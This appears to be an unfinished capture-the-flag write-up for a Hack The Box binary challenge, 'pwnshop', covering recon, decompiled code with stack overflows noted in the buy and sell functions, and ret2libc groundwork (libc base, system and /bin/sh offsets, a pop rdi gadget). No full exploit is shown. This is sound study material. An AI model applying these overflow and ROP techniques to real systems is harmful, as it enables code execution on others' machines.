# pwnshop

## Recon

```bash
file pwnshop    
pwnshop: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e354418962cffebad74fa44061f8c58d92c0e706, for GNU/Linux 3.2.0, stripped
```

file securities

```bash
$ pwn checksec pwnshop    
[*] 'pwnshop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```bash
$ readelf -l -W pwnshop | grep "GNU_STACK"
  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x10

```

## Identifying main

Entry point => 0x555555555120
main => 0x5555555550a0

## main

```c

undefined  [16] main(void)

{
  undefined auVar1 [16];
  int input;
  ulong in_RCX;
  char choice;
  
  init_alarms();
  puts("========= HTB PwnShop ===========");
  while( true ) {
    while( true ) {
      puts("What do you wanna do?");
      printf("1> Buy\n2> Sell\n3> Exit\n> ");
      input = getchar();
      getchar();
      choice = (char)input;
      if (choice != '2') break;
      sell();
    }
    if (choice == '3') break;
    if (choice == '1') {
      buy();
    }
    else {
      puts("Please try again.");
    }
  }
  auVar1._8_8_ = 0;
  auVar1._0_8_ = in_RCX;
  return auVar1 << 0x40;
}


```

## buy

- overflow_me is allocated 72 bytes but allows 80 bytes to be written

```c
void buy(void) {
  undefined overflow_me [72];
  
  puts("Sorry, we aren\'t selling right now.");
  printf("But you can place a request. \nEnter details: ");
  read(0,overflow_me,80);
  return;
}
```

## sell

- target1 is allocated 8 bytes but allows for 31 byte input
- target2 is allocated 32 bytes but allows for 64 byte input
- there is a stack leak for `sell_price`. Might be able to dereference if leak other things
- leaking would allow us to know the offset from `libc`???

```c

void sell(void)

{
  int iVar1;
  long i;
  undefined4 *puVar2;
  byte bVar3;
  undefined4 target1 [8];
  undefined8 sell_price;
  undefined4 *target2;
  
  bVar3 = 0;
  target2 = &DAT_001040c0;
  printf("What do you wish to sell? ");
  sell_price = 0;
  puVar2 = target1;
  for (i = 8; i != 0; i = i + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + (ulong)bVar3 * -2 + 1;
  }
  read(0,target1,31);
  printf("How much do you want for it? ");
  read(0,&sell_price,8);
  iVar1 = strcmp((char *)&sell_price,"13.37\n");
  if (iVar1 == 0) {
    puts("Sounds good. Leave details here so I can ask my guy to take a look.");
    puVar2 = target2;
    for (i = 16; i != 0; i = i + -1) {
      *puVar2 = 0;
      puVar2 = puVar2 + (ulong)bVar3 * -2 + 1;
    }
    read(0,target2,64);
  }
  else {
    printf("What? %s? The best I can do is 13.37$\n",(char *)&sell_price);
  }
  return;
}


```

## Gadgets

- dumping gadgets
```bash
$ ROPgadget --binary pwnshop > gadgets.txt
```

- no syscall
```bash
cat gadgets | grep "syscall"
```

## ret2libc

- libc address
- base address is `0x00007ffff7dc2000`

```bash
$ ldd pwnshop
        linux-vdso.so.1 (0x00007ffff7fc9000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dc2000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)
```

- getting address to system

```bash
$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
  1513: 000000000004dab0    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5

```

- getting address of /bin/sh

```bash
$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
 197e34 /bin/sh
```

- getting rop gadget for `pop rdi`

```bash
$ cat gadgets.txt | grep "pop rdi"
0x00000000000013c3 : pop rdi ; ret
```